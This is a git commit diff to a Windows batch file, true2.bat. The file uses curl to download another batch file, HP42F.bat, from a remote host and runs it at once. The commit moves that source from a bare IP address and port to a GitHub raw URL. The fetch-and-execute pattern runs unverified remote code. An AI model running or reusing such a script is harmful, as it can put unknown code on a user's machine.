7eb2b635b1f0dd3882bad58f99347ad96bd81c52
ธนาวัล <152389095+thanawan230653@users.noreply.github.com>
2025-11-08 23:29:20 +0700

    Update true2.bat

--- Mk/true2.bat
+++ Mk/true2.bat
@@ -1,5 +1,5 @@
 @echo off
-curl -O http://49.228.131.69:3661/True/HP42F.bat
+curl -O https://raw.githubusercontent.com/thanawan230653/Apple-ott/refs/heads/main/Mk/HP42F.bat
 cls
 start HP42F.bat
 exit
